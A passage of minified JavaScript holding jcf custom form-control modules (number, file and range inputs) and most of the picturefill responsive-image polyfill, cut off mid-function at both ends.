e=this.realElement.is(":checked"),t=this.realElement.is(":disabled");this.fakeElement.toggleClass(this.options.checkedClass,e).toggleClass(this.options.uncheckedClass,!e).toggleClass(this.options.disabledClass,t),this.labelElement&&this.labelElement.toggleClass(this.options.labelActiveClass,e)},destroy:function(){this.options.wrapNative?this.realElement.insertBefore(this.fakeElement).css({position:"",width:"",height:"",opacity:"",margin:""}):this.realElement.removeClass(this.options.hiddenClass),this.fakeElement.off("jcf-pointerdown",this.onPress),this.fakeElement.remove(),this.doc.off("jcf-pointerup",this.onRelease),this.realElement.off({blur:this.onBlur,focus:this.onFocus,click:this.onRealClick})}}}))}(jcf),jcf.addModule((function(e){"use strict";return{name:"Number",selector:'input[type="number"]',options:{realElementClass:"jcf-real-element",fakeStructure:'<span class="jcf-number"><span class="jcf-btn-inc"></span><span class="jcf-btn-dec"></span></span>',btnIncSelector:".jcf-btn-inc",btnDecSelector:".jcf-btn-dec",pressInterval:150},matchElement:function(e){return e.is(this.selector)},init:function(){this.initStructure(),this.attachEvents(),this.refresh()},initStructure:function(){this.page=e("html"),this.realElement=e(this.options.element).addClass(this.options.realElementClass),this.fakeElement=e(this.options.fakeStructure).insertBefore(this.realElement).prepend(this.realElement),this.btnDec=this.fakeElement.find(this.options.btnDecSelector),this.btnInc=this.fakeElement.find(this.options.btnIncSelector),this.initialValue=parseFloat(this.realElement.val())||0,this.minValue=parseFloat(this.realElement.attr("min")),this.maxValue=parseFloat(this.realElement.attr("max")),this.stepValue=parseFloat(this.realElement.attr("step"))||1,this.minValue=isNaN(this.minValue)?-1/0:this.minValue,this.maxValue=isNaN(this.maxValue)?1/0:this.maxValue,isFinite(this.maxValue)&&(this.maxValue-=(this.maxValue-this.minValue)%this.stepValue)},attachEvents:function(){this.realElement.on({focus:this.onFocus}),this.btnDec.add(this.btnInc).on("jcf-pointerdown",this.onBtnPress)},onBtnPress:function(e){var t,s=this;this.realElement.is(":disabled")||(t=this.btnInc.is(e.currentTarget),s.step(t),clearInterval(this.stepTimer),this.stepTimer=setInterval((function(){s.step(t)}),this.options.pressInterval),this.page.on("jcf-pointerup",this.onBtnRelease))},onBtnRelease:function(){clearInterval(this.stepTimer),this.page.off("jcf-pointerup",this.onBtnRelease)},onFocus:function(){this.fakeElement.addClass(this.options.focusClass),this.realElement.on({blur:this.onBlur,keydown:this.onKeyPress})},onBlur:function(){this.fakeElement.removeClass(this.options.focusClass),this.realElement.off({blur:this.onBlur,keydown:this.onKeyPress})},onKeyPress:function(e){38!==e.which&&40!==e.which||(e.preventDefault(),this.step(38===e.which))},step:function(e){var t=parseFloat(this.realElement.val()),s=t||0,i=this.stepValue*(e?1:-1),n=isFinite(this.minValue)?this.minValue:this.initialValue-Math.abs(s*this.stepValue),o=Math.abs(n-s)%this.stepValue;o?e?s+=i-o:s-=o:s+=i,s<this.minValue?s=this.minValue:s>this.maxValue&&(s=this.maxValue),s!==t&&(this.realElement.val(s).trigger("change"),this.refresh())},refresh:function(){var e=this.realElement.is(":disabled"),t=parseFloat(this.realElement.val());this.fakeElement.toggleClass(this.options.disabledClass,e),this.btnDec.toggleClass(this.options.disabledClass,t===this.minValue),this.btnInc.toggleClass(this.options.disabledClass,t===this.maxValue)},destroy:function(){this.realElement.removeClass(this.options.realElementClass).insertBefore(this.fakeElement),this.fakeElement.remove(),clearInterval(this.stepTimer),this.page.off("jcf-pointerup",this.onBtnRelease),this.realElement.off({keydown:this.onKeyPress,focus:this.onFocus,blur:this.onBlur})}}})),jcf.addModule((function(e){"use strict";return{name:"File",selector:'input[type="file"]',options:{fakeStructure:'<span class="jcf-file"><span class="jcf-fake-input"></span><span class="jcf-upload-button"><span class="jcf-button-content"></span></span></span>',buttonText:"Choose file",placeholderText:"No file chosen",realElementClass:"jcf-real-element",extensionPrefixClass:"jcf-extension-",selectedFileBlock:".jcf-fake-input",buttonTextBlock:".jcf-button-content"},matchElement:function(e){return e.is('input[type="file"]')},init:function(){this.initStructure(),this.attachEvents(),this.refresh()},initStructure:function(){this.doc=e(document),this.realElement=e(this.options.element).addClass(this.options.realElementClass),this.fakeElement=e(this.options.fakeStructure).insertBefore(this.realElement),this.fileNameBlock=this.fakeElement.find(this.options.selectedFileBlock),this.buttonTextBlock=this.fakeElement.find(this.options.buttonTextBlock).text(this.options.buttonText),this.realElement.appendTo(this.fakeElement).css({position:"absolute",opacity:0})},attachEvents:function(){this.realElement.on({"jcf-pointerdown":this.onPress,change:this.onChange,focus:this.onFocus})},onChange:function(){this.refresh()},onFocus:function(){this.fakeElement.addClass(this.options.focusClass),this.realElement.on("blur",this.onBlur)},onBlur:function(){this.fakeElement.removeClass(this.options.focusClass),this.realElement.off("blur",this.onBlur)},onPress:function(){this.fakeElement.addClass(this.options.pressedClass),this.doc.on("jcf-pointerup",this.onRelease)},onRelease:function(){this.fakeElement.removeClass(this.options.pressedClass),this.doc.off("jcf-pointerup",this.onRelease)},getFileName:function(){var t="",s=this.realElement.prop("files");return s&&s.length?e.each(s,(function(e,s){t+=(e>0?", ":"")+s.name})):t=this.realElement.val().replace(/^[\s\S]*(?:\\|\/)([\s\S^\\\/]*)$/g,"$1"),t},getFileExtension:function(){var e=this.realElement.val();return e.lastIndexOf(".")<0?"":e.substring(e.lastIndexOf(".")+1).toLowerCase()},updateExtensionClass:function(){var e=this.getFileExtension(),t=this.fakeElement.prop("className").replace(new RegExp("(\\s|^)"+this.options.extensionPrefixClass+"[^ ]+","gi"),"");this.fakeElement.prop("className",t),e&&this.fakeElement.addClass(this.options.extensionPrefixClass+e)},refresh:function(){var e=this.getFileName()||this.options.placeholderText;this.fakeElement.toggleClass(this.options.disabledClass,this.realElement.is(":disabled")),this.fileNameBlock.text(e),this.updateExtensionClass()},destroy:function(){this.realElement.insertBefore(this.fakeElement).removeClass(this.options.realElementClass).css({position:"",opacity:""}),this.fakeElement.remove(),this.realElement.off({"jcf-pointerdown":this.onPress,change:this.onChange,focus:this.onFocus,blur:this.onBlur}),this.doc.off("jcf-pointerup",this.onRelease)}}})),jcf.addModule((function(e){"use strict";return{name:"Range",selector:'input[type="range"]',options:{realElementClass:"jcf-real-element",fakeStructure:'<span class="jcf-range"><span class="jcf-range-wrapper"><span class="jcf-range-track"><span class="jcf-range-handle"></span></span></span></span>',dataListMark:'<span class="jcf-range-mark"></span>',rangeDisplayWrapper:'<span class="jcf-range-display-wrapper"></span>',rangeDisplay:'<span class="jcf-range-display"></span>',handleSelector:".jcf-range-handle",trackSelector:".jcf-range-track",activeHandleClass:"jcf-active-handle",verticalClass:"jcf-vertical",orientation:"horizontal",range:!1,dragHandleCenter:!0,snapToMarks:!0,snapRadius:5,minRange:0},matchElement:function(e){return e.is(this.selector)},init:function(){this.initStructure(),this.attachEvents(),this.refresh()},initStructure:function(){for(this.page=e("html"),this.realElement=e(this.options.element).addClass(this.options.hiddenClass),this.fakeElement=e(this.options.fakeStructure).insertBefore(this.realElement).prepend(this.realElement),this.track=this.fakeElement.find(this.options.trackSelector),this.trackHolder=this.track.parent(),this.handle=this.fakeElement.find(this.options.handleSelector),this.createdHandleCount=0,this.activeDragHandleIndex=0,this.isMultiple=this.realElement.prop("multiple")||"string"==typeof this.realElement.attr("multiple"),this.values=this.isMultiple?this.realElement.attr("value").split(","):[this.realElement.val()],this.handleCount=this.isMultiple?this.values.length:1,this.rangeDisplayWrapper=e(this.options.rangeDisplayWrapper).insertBefore(this.track),"min"!==this.options.range&&"all"!==this.options.range||(this.rangeMin=e(this.options.rangeDisplay).addClass("jcf-range-min").prependTo(this.rangeDisplayWrapper)),"max"!==this.options.range&&"all"!==this.options.range||(this.rangeMax=e(this.options.rangeDisplay).addClass("jcf-range-max").prependTo(this.rangeDisplayWrapper));this.createdHandleCount<this.handleCount;)this.createdHandleCount++,this.handle.clone().addClass("jcf-index-"+this.createdHandleCount).insertBefore(this.handle),this.createdHandleCount>1&&(this.rangeMid||(this.rangeMid=e()),this.rangeMid=this.rangeMid.add(e(this.options.rangeDisplay).addClass("jcf-range-mid").prependTo(this.rangeDisplayWrapper)));this.handle.detach(),this.handle=null,this.handles=this.fakeElement.find(this.options.handleSelector),this.handles.eq(0).addClass(this.options.activeHandleClass),this.isVertical="vertical"===this.options.orientation,this.directionProperty=this.isVertical?"top":"left",this.offsetProperty=this.isVertical?"bottom":"left",this.eventProperty=this.isVertical?"pageY":"pageX",this.sizeProperty=this.isVertical?"height":"width",this.sizeMethod=this.isVertical?"innerHeight":"innerWidth",this.fakeElement.css("touchAction",this.isVertical?"pan-x":"pan-y"),this.isVertical&&this.fakeElement.addClass(this.options.verticalClass),this.minValue=parseFloat(this.realElement.attr("min")),this.maxValue=parseFloat(this.realElement.attr("max")),this.stepValue=parseFloat(this.realElement.attr("step"))||1,this.minValue=isNaN(this.minValue)?0:this.minValue,this.maxValue=isNaN(this.maxValue)?100:this.maxValue,1!==this.stepValue&&(this.maxValue-=(this.maxValue-this.minValue)%this.stepValue),this.stepsCount=(this.maxValue-this.minValue)/this.stepValue,this.createDataList()},attachEvents:function(){this.realElement.on({focus:this.onFocus}),this.trackHolder.on("jcf-pointerdown",this.onTrackPress),this.handles.on("jcf-pointerdown",this.onHandlePress)},createDataList:function(){var t=this,s=[],i=this.realElement.attr("list");i&&(e("#"+i).find("option").each((function(){var i,n=parseFloat(this.value||this.innerHTML);isNaN(n)||(i=t.valueToOffset(n),s.push({value:n,offset:i}),e(t.options.dataListMark).text(n).attr({"data-mark-value":n}).css(t.offsetProperty,i+"%").appendTo(t.track))})),s.length&&(t.dataValues=s))},getDragHandleRange:function(e){var t=-1/0,s=1/0;return e>0&&(t=this.valueToStepIndex(parseFloat(this.values[e-1])+this.options.minRange)),e<this.handleCount-1&&(s=this.valueToStepIndex(parseFloat(this.values[e+1])-this.options.minRange)),{minStepIndex:t,maxStepIndex:s}},getNearestHandle:function(t){this.isVertical&&(t=1-t);var s=this.handles.eq(0),i=1/0,n=this;return this.handleCount>1&&this.handles.each((function(){var o=parseFloat(this.style[n.offsetProperty])/100,a=Math.abs(o-t);a<i&&(i=a,s=e(this))})),s},onTrackPress:function(e){var t,s,i;e.preventDefault(),this.realElement.is(":disabled")||this.activeDragHandle||(t=this.track[this.sizeMethod](),s=this.track.offset()[this.directionProperty],this.activeDragHandle=this.getNearestHandle((e[this.eventProperty]-s)/this.trackHolder[this.sizeMethod]()),this.activeDragHandleIndex=this.handles.index(this.activeDragHandle),this.handles.removeClass(this.options.activeHandleClass).eq(this.activeDragHandleIndex).addClass(this.options.activeHandleClass),i=this.activeDragHandle[this.sizeMethod]()/2,this.dragData={trackSize:t,innerOffset:i,trackOffset:s,min:s,max:s+t},this.page.on({"jcf-pointermove":this.onHandleMove,"jcf-pointerup":this.onHandleRelease}),"mouse"===e.pointerType&&this.realElement.focus(),this.onHandleMove(e))},onHandlePress:function(t){var s,i,n;t.preventDefault(),this.realElement.is(":disabled")||this.activeDragHandle||(this.activeDragHandle=e(t.currentTarget),this.activeDragHandleIndex=this.handles.index(this.activeDragHandle),this.handles.removeClass(this.options.activeHandleClass).eq(this.activeDragHandleIndex).addClass(this.options.activeHandleClass),s=this.track[this.sizeMethod](),i=this.track.offset()[this.directionProperty],n=this.options.dragHandleCenter?this.activeDragHandle[this.sizeMethod]()/2:t[this.eventProperty]-this.handle.offset()[this.directionProperty],this.dragData={trackSize:s,innerOffset:n,trackOffset:i,min:i,max:i+s},this.page.on({"jcf-pointermove":this.onHandleMove,"jcf-pointerup":this.onHandleRelease}),"mouse"===t.pointerType&&this.realElement.focus())},onHandleMove:function(t){var s,i,n,o,a,r=this;if((s=this.isVertical?this.dragData.max+(this.dragData.min-t[this.eventProperty])-this.dragData.innerOffset:t[this.eventProperty]-this.dragData.innerOffset)<this.dragData.min?s=this.dragData.min:s>this.dragData.max&&(s=this.dragData.max),t.preventDefault(),this.options.snapToMarks&&this.dataValues){var l=s-this.dragData.trackOffset;i=(s-this.dragData.trackOffset)/this.dragData.trackSize*100,e.each(this.dataValues,(function(e,t){var s=t.offset/100*r.dragData.trackSize,n=s-r.options.snapRadius,o=s+r.options.snapRadius;if(l>=n&&l<=o)return i=t.offset,!1}))}else i=(s-this.dragData.trackOffset)/this.dragData.trackSize*100;n=Math.round(i*this.stepsCount/100),this.handleCount>1&&(n<(a=this.getDragHandleRange(this.activeDragHandleIndex)).minStepIndex?n=Math.max(a.minStepIndex,n):n>a.maxStepIndex&&(n=Math.min(a.maxStepIndex,n))),o=n*(100/this.stepsCount),this.dragData.stepIndex!==n&&(this.dragData.stepIndex=n,this.dragData.offset=o,this.activeDragHandle.css(this.offsetProperty,this.dragData.offset+"%"),this.values[this.activeDragHandleIndex]=""+this.stepIndexToValue(n),this.updateValues(),this.realElement.trigger("input"))},onHandleRelease:function(){var e;"number"==typeof this.dragData.offset&&(e=this.stepIndexToValue(this.dragData.stepIndex),this.realElement.val(e).trigger("change")),this.page.off({"jcf-pointermove":this.onHandleMove,"jcf-pointerup":this.onHandleRelease}),delete this.activeDragHandle,delete this.dragData},onFocus:function(){this.fakeElement.hasClass(this.options.focusClass)||(this.fakeElement.addClass(this.options.focusClass),this.realElement.on({blur:this.onBlur,keydown:this.onKeyPress}))},onBlur:function(){this.fakeElement.removeClass(this.options.focusClass),this.realElement.off({blur:this.onBlur,keydown:this.onKeyPress})},onKeyPress:function(e){var t=38===e.which||39===e.which,s=37===e.which||40===e.which;if(9===e.which&&this.handleCount>1){if(e.shiftKey&&this.activeDragHandleIndex>0)this.activeDragHandleIndex--;else{if(e.shiftKey||!(this.activeDragHandleIndex<this.handleCount-1))return;this.activeDragHandleIndex++}e.preventDefault(),this.handles.removeClass(this.options.activeHandleClass).eq(this.activeDragHandleIndex).addClass(this.options.activeHandleClass)}(s||t)&&(e.preventDefault(),this.step(t?this.stepValue:-this.stepValue))},updateValues:function(){var e=this.values.join(",");this.values.length>1?(this.realElement.prop("valueLow",this.values[0]),this.realElement.prop("valueHigh",this.values[this.values.length-1]),this.realElement.val(e),this.realElement.val()!==e&&this.realElement.val(this.values[this.values.length-1])):this.realElement.val(e),this.updateRanges()},updateRanges:function(){var e,t=this;this.rangeMin&&(e=this.handles[0],this.rangeMin.css(this.offsetProperty,0).css(this.sizeProperty,e.style[this.offsetProperty])),this.rangeMax&&(e=this.handles[this.handles.length-1],this.rangeMax.css(this.offsetProperty,e.style[this.offsetProperty]).css(this.sizeProperty,100-parseFloat(e.style[this.offsetProperty])+"%")),this.rangeMid&&this.handles.each((function(e,s){var i,n;e>0&&(i=t.handles[e-1],(n=t.rangeMid[e-1]).style[t.offsetProperty]=i.style[t.offsetProperty],n.style[t.sizeProperty]=parseFloat(s.style[t.offsetProperty])-parseFloat(i.style[t.offsetProperty])+"%")}))},step:function(e){var t=parseFloat(this.values[this.activeDragHandleIndex||0]),s=t,i=this.minValue,n=this.maxValue;isNaN(t)&&(s=0),s+=e,this.handleCount>1&&(this.activeDragHandleIndex>0&&(i=parseFloat(this.values[this.activeDragHandleIndex-1])+this.options.minRange),this.activeDragHandleIndex<this.handleCount-1&&(n=parseFloat(this.values[this.activeDragHandleIndex+1])-this.options.minRange)),s>n?s=n:s<i&&(s=i),s!==t&&(this.values[this.activeDragHandleIndex||0]=""+s,this.updateValues(),this.realElement.trigger("input").trigger("change"),this.setSliderValue(this.values))},valueToStepIndex:function(e){return(e-this.minValue)/this.stepValue},stepIndexToValue:function(e){return this.minValue+this.stepValue*e},valueToOffset:function(e){var t=this.maxValue-this.minValue;return(e-this.minValue)/t*100},getSliderValue:function(){return e.map(this.values,(function(e){return parseFloat(e)||0}))},setSliderValue:function(e){var t=this;this.handles.each((function(s,i){i.style[t.offsetProperty]=t.valueToOffset(e[s])+"%"}))},refresh:function(){var e=this.realElement.is(":disabled");this.fakeElement.toggleClass(this.options.disabledClass,e),this.setSliderValue(this.getSliderValue()),this.updateRanges()},destroy:function(){this.realElement.removeClass(this.options.hiddenClass).insertBefore(this.fakeElement),this.fakeElement.remove(),this.realElement.off({keydown:this.onKeyPress,focus:this.onFocus,blur:this.onBlur})}}})),function(e){var t=navigator.userAgent;e.HTMLPictureElement&&/ecko/.test(t)&&t.match(/rv\:(\d+)/)&&RegExp.$1<45&&addEventListener("resize",function(){var t,s=document.createElement("source"),i=function(e){var t,i,n=e.parentNode;"PICTURE"===n.nodeName.toUpperCase()?(t=s.cloneNode(),n.insertBefore(t,n.firstElementChild),setTimeout((function(){n.removeChild(t)}))):(!e._pfLastSize||e.offsetWidth>e._pfLastSize)&&(e._pfLastSize=e.offsetWidth,i=e.sizes,e.sizes+=",100vw",setTimeout((function(){e.sizes=i})))},n=function(){var e,t=document.querySelectorAll("picture > img, img[srcset][sizes]");for(e=0;e<t.length;e++)i(t[e])},o=function(){clearTimeout(t),t=setTimeout(n,99)},a=e.matchMedia&&matchMedia("(orientation: landscape)"),r=function(){o(),a&&a.addListener&&a.addListener(o)};return s.srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==",/^[c|i]|d$/.test(document.readyState||"")?r():document.addEventListener("DOMContentLoaded",r),o}())}(window),function(e,t){"use strict";function s(e){return" "===e||"\t"===e||"\n"===e||"\f"===e||"\r"===e}function i(e,t,s,i){var n,o,a;return"saveData"===x.algorithm?e>2.7?a=s+1:(o=(t-s)*(n=Math.pow(e-.6,1.5)),i&&(o+=.1*n),a=e+o):a=s>1?Math.sqrt(e*t):e,a>s}function n(e,t){return e.res-t.res}function o(e,t,s){var i;return!s&&t&&(s=(s=e[h.ns].sets)&&s[s.length-1]),(i=a(t,s))&&(t=h.makeUrl(t),e[h.ns].curSrc=t,e[h.ns].curCan=i,i.res||_(i,i.set.sizes)),i}function a(e,t){var s,i,n;if(e&&t)for(n=h.parseSet(t),e=h.makeUrl(e),s=0;s<n.length;s++)if(e===h.makeUrl(n[s].url)){i=n[s];break}return i}t.createElement("picture");var r,l,c,h={},d=!1,p=function(){},u=t.createElement("img"),f=u.getAttribute,m=u.setAttribute,g=u.removeAttribute,v=t.documentElement,w={},x={algorithm:""},C=navigator.userAgent,E=/rident/.test(C)||/ecko/.test(C)&&C.match(/rv\:(\d+)/)&&RegExp.$1>35,b="currentSrc",y=/\s+\+?\d+(e\d+)?w/,k=/(\([^)]+\))?\s*(.+)/,S=e.picturefillCFG,T="font-size:100%!important;",A=!0,j={},D={},I=e.devicePixelRatio,H={px:1,in:96},M=t.createElement("a"),P=!1,$=/^[ \t\n\r\u000c]+/,F=/^[, \t\n\r\u000c]+/,O=/^[^ \t\n\r\u000c]+/,z=/[,]+$/,B=/^\d+$/,N=/^-?(?:[0-9]+|[0-9]*\.[0-9]+)(?:[eE][+-]?[0-9]+)?$/,R=function(e,t,s,i){e.addEventListener?e.addEventListener(t,s,i||!1):e.attachEvent&&e.attachEvent("on"+t,s)},L=function(e){var t={};return function(s){return s in t||(t[s]=e(s)),t[s]}},V=function(){var e=/^([\d\.]+)(em|vw|px)$/,t=L((function(e){return"return "+function(){for(var e=arguments,t=0,s=e[0];++t in e;)s=s.replace(e[t],e[++t]);return s}((e||"").toLowerCase(),/\band\b/g,"&&",/,/g,"||",/min-([a-z-\s]+):/g,"e.$1>=",/max-([a-z-\s]+):/g,"e.$1<=",/calc([^)]+)/g,"($1)",/(\d+[\.]*[\d]*)([a-z]+)/g,"($1 * e.$2)",/^(?!(e.[a-z]|[0-9\.&=|><\+\-\*\(\)\/])).*/gi,"")+";"}));return function(s,i){var n;if(!(s in j))if(j[s]=!1,i&&(n=s.match(e)))j[s]=n[1]*H[n[2]];else try{j[s]=new Function("e",t(s))(H)}catch(e){}return j[s]}}(),_=function(e,t){return e.w?(e.cWidth=h.calcListLength(t||"100vw"),e.res=e.w/e.cWidth):e.res=e.d,e},W=function(e){if(d){var s,i,n,o=e||{};if(o.elements&&1===o.elements.nodeType&&("IMG"===o.elements.nodeName.toUpperCase()?o.elements=[o.elements]:(o.context=o.elements,o.elements=null)),n=(s=o.elements||h.qsa(o.context||t,o.reevaluate||o.reselect?h.sel:h.selShort)).length){for(h.setupRun(o),P=!0,i=0;i<n;i++)h.fillImg(s[i],o);h.teardownRun(o)}}};e.console&&console.warn,b in u||(b="src"),w["image/jpeg"]=!0,w["image/gif"]=!0,w["image/png"]=!0,w["image/svg+xml"]=t.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image","1.1"),h.ns=("pf"+(new Date).getTime()).substr(0,9),h.supSrcset="srcset"in u,h.supSizes="sizes"in u,h.supPicture=!!e.HTMLPictureElement,h.supSrcset&&h.supPicture&&!h.supSizes&&function(e){u.srcset="data:,a",e.src="data:,a",h.supSrcset=u.complete===e.complete,h.supPicture=h.supSrcset&&h.supPicture}(t.createElement("img")),h.supSrcset&&!h.supSizes?function(){var e="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==",s=t.createElement("img"),i=function(){2===s.width&&(h.supSizes=!0),l=h.supSrcset&&!h.supSizes,d=!0,setTimeout(W)};s.onload=i,s.onerror=i,s.setAttribute("sizes","9px"),s.srcset=e+" 1w,data:image/gif;base64,R0lGODlhAgABAPAAAP///wAAACH5BAAAAAAALAAAAAACAAEAAAICBAoAOw== 9w",s.src=e}():d=!0,h.selShort="picture>img,img[srcset]",h.sel=h.selShort,h.cfg=x,h.DPR=I||1,h.u=H,h.types=w,h.setSize=p,h.makeUrl=L((function(e){return M.href=e,M.href})),h.qsa=function(e,t){return"querySelector"in e?e.querySelectorAll(t):[]},h.matchesMedia=function(){return e.matchMedia&&(matchMedia("(min-width: 0.1em)")||{}).matches?h.matchesMedia=function(e){return!e||matchMedia(e).matches}:h.matchesMedia=h.mMQ,h.matchesMedia.apply(this,arguments)},h.mMQ=function(e){return!e||V(e)},h.calcLength=function(e){var t=V(e,!0)||!1;return t<0&&(t=!1),t},h.supportsType=function(e){return!e||w[e]},h.parseSize=L((function(e){var t=(e||"").match(k);return{media:t&&t[1],length:t&&t[2]}})),h.parseSet=function(e){return e.cands||(e.cands=function(e,t){function i(t){var s,i=t.exec(e.substring(d));if(i)return s=i[0],d+=s.length,s}function n(){var e,s,i,n,r,l,c,h,d,u=!1,f={};for(n=0;n<a.length;n++)l=(r=a[n])[r.length-1],c=r.substring(0,r.length-1),h=parseInt(c,10),d=parseFloat(c),B.test(c)&&"w"===l?((e||s)&&(u=!0),0===h?u=!0:e=h):N.test(c)&&"x"===l?((e||s||i)&&(u=!0),d<0?u=!0:s=d):B.test(c)&&"h"===l?((i||s)&&(u=!0),0===h?u=!0:i=h):u=!0;u||(f.url=o,e&&(f.w=e),s&&(f.d=s),i&&(f.h=i),i||s||e||(f.d=1),1===f.d&&(t.has1x=!0),f.set=t,p.push(f))}for(var o,a,r,l,c,h=e.length,d=0,p=[];;){if(i(F),d>=h)return p;o=i(O),a=[],","===o.slice(-1)?(o=o.replace(z,""),n()):function(){for(i($),r="",l="in descriptor";;){if(c=e.charAt(d),"in descriptor"===l)if(s(c))r&&(a.push(r),r="",l="after descriptor");else{if(","===c)return d+=1,r&&a.push(r),void n();if("("===c)r+=c,l="in parens";else{if(""===c)return r&&a.push(r),void n();r+=c}}else if("in parens"===l)if(")"===c)r+=c,l="in descriptor";else{if(""===c)return a.push(r),void n();r+=c}else if("after descriptor"===l)if(s(c));else{if(""===c)return void n();l="in descriptor",d-=1}d+=1}}()}}(e.srcset,e)),e.cands},h.getEmValue=function(){var e;if(!r&&(e=t.body)){var s=t.createElement("div"),i=v.style.cssText,n=e.style.cssText;s.style.cssText="position:absolute;left:0;visibility:hidden;display:block;padding:0;border:none;font-size:1em;width:1em;overflow:hidden;clip:rect(0px, 0px, 0px, 0px)",v.style.cssText=T,e.style.cssText=T,e.appendChild(s),r=s.offsetWidth,e.removeChild(s),r=parseFloat(r,10),v.style.cssText=i,e.style.cssText=n}return r||16},h.calcListLength=function(e){if(!(e in D)||x.uT){var t=h.calcLength(function(e){var t,i,n,o,a,r,l=/^(?:[+-]?[0-9]+|[0-9]*\.[0-9]+)(?:[eE][+-]?[0-9]+)?(?:ch|cm|em|ex|in|mm|pc|pt|px|rem|vh|vmin|vmax|vw)$/i,c=/^calc\((?:[0-9a-z \.\+\-\*\/\(\)]+)\)$/i;for(i=function(e){function t(){o&&(a.push(o),o="")}function i(){a[0]&&(r.push(a),a=[])}for(var n,o="",a=[],r=[],l=0,c=0,h=!1;;){if(""===(n=e.charAt(c)))return t(),i(),r;if(h){if("*"===n&&"/"===e[c+1]){h=!1,c+=2,t();continue}c+=1}else{if(s(n)){if(e.charAt(c-1)&&s(e.charAt(c-1))||!o){c+=1;continue}if(0===l){t(),c+=1;continue}n=" "}else if("("===n)l+=1;else if(")"===n)l-=1;else{if(","===n){t(),i(),c+=1;continue}if("/"===n&&"*"===e.charAt(c+1)){h=!0,c+=2;continue}}o+=n,c+=1}}}(e),n=i.length,t=0;t<n;t++)if(function(e){return!!(l.test(e)&&parseFloat(e)>=0)||!!c.test(e)||"0"===e||"-0"===e||"+0"===e}(a=(o=i[t])[o.length-1])){if(r=a,o.pop(),0===o.length)return r;if(o=o.join(" "),h.matchesMedia(o))return r}return"100vw"}(e));D[e]=t||H.width}return D[e]},h.setRes=function(e){var t;if(e)for(var s=0,i=(t=h.parseSet(e)).length;s<i;s++)_(t[s],e.sizes);return t},h.setRes.res=_,h.applySetCandidate=function(e,t){if(e.length){var s,a,r,l,c,d,p,u,f,m=t[h.ns],g=h.DPR;if(d=m.curSrc||t[b],(p=m.curCan||o(t,d,e[0].set))&&p.set===e[0].set&&((f=E&&!t.complete&&p.res-.1>g)||(p.cached=!0,p.res>=g&&(c=p))),!c)for(e.sort(n),c=e[(l=e.length)-1],a=0;a<l;a++)if((s=e[a]).res>=g){c=e[r=a-1]&&(f||d!==h.makeUrl(s.url))&&i(e[r].res,s.res,g,e[r].cached)?e[r]:s;break}c&&(u=h.makeUrl(c.url),m.curSrc=u,m.curCan=c,u!==d&&h.setSrc(t,c),h.setSize(t))}},h.setSrc=function(e,t){var s;e.src=t.url,"image/svg+xml"===t.set.type&&(s=e.style.width,e.style.width=e.offsetWidth+1+"px",e.offsetWidth+1&&(e.style.width=s))},h.getSet=function(e){var t,s,i,n=!1,o=e[h.ns].sets;for(t=0;t<o.length&&!n;t++)if((s=o[t]).srcset&&h.matchesMedia(s.media)&&(i=h.supportsType(s.type))){"pending"===i&&(s=i),n=s;break}return n},h.parseSets=function(e,t,s){var i,n,o,r,c=t&&"PICTURE"===t.nodeName.toUpperCase(),d=e[h.ns];(void 0===d.src||s.src)&&(d.src=f.call(e,"src"),d.src?m.call(e,"data-pfsrc",d.src):g.call(e,"data-pfsrc")),(void 0===d.srcset||s.srcset||!h.supSrcset||e.srcset)&&(i=f.call(e,"srcset"),d.srcset=i,r=!0),d.sets=[],c&&(d.pic=!0,function(e,t){var s,i,n,o,a=e.getElementsByTagName("source");for(s=0,i=a.length;s<i;s++)(n=a[s])[h.ns]=!0,(o=n.getAttribute("srcset"))&&t.push({srcset:o,media:n.getAttribute("media"),type:n.getAttribute("type"),sizes:n.getAttribute("sizes")})}(t,d.sets)),d.srcset?(n={srcset:d.srcset,sizes:f.call(e,"sizes")},d.sets.push(n),(o=(l||d.src)&&y.test(d.srcset||""))||!d.src||a(d.src,n)||n.has1x||(n.srcset+=", "+d.src,n.cands.push({url:d.src,d:1,set:n}))):d.src&&d.sets.push({srcset:d.src,sizes:null}),d.curCan=null,d.curSrc=void 0,d.supported=!(c||n&&!h.supSrcset||o&&!h.supSizes),r&&h.supSrcset&&!d.supported&&(i?(m.call(e,"data-pfsrcset",i),e.srcset=""):g.call(e,"data-pfsrcset")),d.supported&&!d.srcset&&(!d.src&&e.src||e.src!==h.makeUrl(d.src))&&(null===d.src?e.removeAttribute("src"):e.src=d.src),d.parsed=!0},h.fillImg=function(e,t){var s,i=t.reselect||t.reevaluate;e[h.ns]||(e[h.ns]={}),s=e[h.ns],(i||s.evaled!==c)&&(s.parsed&&!t.reevaluate||h.parseSets(e,e.parentNode,t),s.supported?s.evaled=c:function(e){var t,s=h.getSet(e),i=!1;"pending"!==s&&(i=c,s&&(t=h.setRes(s),h.applySetCandidate(t,e))),e[h.ns].evaled=i}(e))},h.setupRun=function(){P&&!A&&I===e.devicePixelRatio||(A=!1,I=e.devicePixelRatio,j={},D={},h.DPR=I||1,H.width=Math.max(e.innerWidth||0,v.clientWidth),H.height=Math.max(e.innerHeight||0,v.clientHeight),H.vw=H.width/100,H.vh=H.height/100,c=[H.height,H.width,I].join("-"),H.em=h.getEmValue(),H.rem=H.em)},h.supPicture?(W=p,h.fillImg=p):function(){var s,i=e.attachEvent?/d$|^c/:/d$|^c|^i/,n=function(){var e=t.readyState||"";o=setTimeout(n,"loading"===e?200:999),t.body&&(h.fillImgs(),(s=s||i.test(e))&&clearTimeout(o))},o=setTimeout(n,t.body?9:99),a=v.clientHeight;R(e,"resize",function(e,t){var s,i,n=function(){var t=new Date-i;t<99?s=setTimeout(n,99-t):(s=null,e())};return function(){i=new Date,s||(s=setTimeout(n,99))}}((function(){A=Math.max(e.innerWidth||0,v.clientWidth)!==H.width||v.clientHeight!==a,a=v.clientHeight,A&&h.fillImgs()}))),R(t,"readystatechange",n)}(),h.picturefill=W,h.fillImgs=W,h.teardownRun=p,W._=h,e.picturefillCFG={pf:h,push:function(e){var t=e.shift();"function"==typeof h[t]?h[t].apply(h,e):(x[t]=e[0],P&&h.fillImgs({reselect:!0}))}};for(;S&&S.length;)e.picturefillCFG.push(S.shift());e.picturefill=W,"object"==typeof module&&"object"==typeof module.exports?module.exports=W:"function"==typeof define&&define.amd&&define("picturefill",(function(){return W})),h.supPicture||(w["image/webp"]=function(t,s){var i=new e.Image;return 